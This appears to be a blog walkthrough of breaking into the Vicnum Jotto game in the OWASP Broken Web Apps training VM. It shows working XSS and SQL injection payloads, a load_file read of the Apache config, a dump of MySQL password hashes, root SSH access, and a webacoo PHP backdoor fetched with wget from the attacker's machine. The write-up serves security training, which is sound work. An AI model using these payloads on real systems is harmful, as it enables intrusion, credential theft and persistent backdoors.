---
layout: post
title: OWASP Broken Web Apps Vicnum - Jotto
---

I started off just playing the game to see what happens moving through the workflow.  After guessing the word in 43 tries I noticed that the count is being passed from the success page over to the scoreboard, much like its sibling application this ends up being something we can modify in transit.

The second time round I made a wordlist of the second word to guess once I figured out it had an r in it:

{% highlight bash %}
cewl -w wordlist.txt -v -d 0 -m 5 http://www.wordbyletter.com/words_starting_with.php?q=r
{% endhighlight %}

Luckily it did end up starting with an r, that way I didn't have to play the annoying game again just to modify my number of guesses.

After getting to the scoreboard page I noticed that the name get parameter is being injected into an HTML string on the page, try making this the name:

{% highlight javascript %}
<script>alert(1)</script>
{% endhighlight %}

into the URL for the name GET parameter worked.

The name parameter also seems like it might be vulnerable to SQLi

Doing a quick:

{% highlight sql %}
' or 1 = 1 #
{% endhighlight %}

shows query results for all users on the page, so we know its injectable.

Now to get something a little more juicy:
{% highlight sql %}
union all select load_file('/etc/apache2/apache2.conf'),2,3,4#
{% endhighlight %}

This will return the entire apache web config in its entirety.

I suppose just like its sibling lets break in:

{% highlight sql %}
'  union all select user,password,3,4 from mysql.user#
{% endhighlight %}

As in the sibling application this page can be used to get root's password: https://www.hashkiller.co.uk/ which found the root password in question: owaspbwa, this matches the readme when the VM boots up.

Next lets ssh to the VM:

{% highlight  bash %}
ssh root@ip
pw: owaspbwa
{% endhighlight %}

Now for a persisted backdoor, webacoo worked for the last one, why not use it again.

{% highlight bash %}
webacoo -g -o bd.php
{% endhighlight %}

Next fire up SimpleHTTPServer in Parrot and change directory to the web root /var/www on the VM and run:

{% highlight bash %}
wget http://iptoparrot:8000/bd.php
{% endhighlight %}

Then to test things out:

{% highlight bash %}
webacoo -t -u http://ip/bd.php
{% endhighlight %}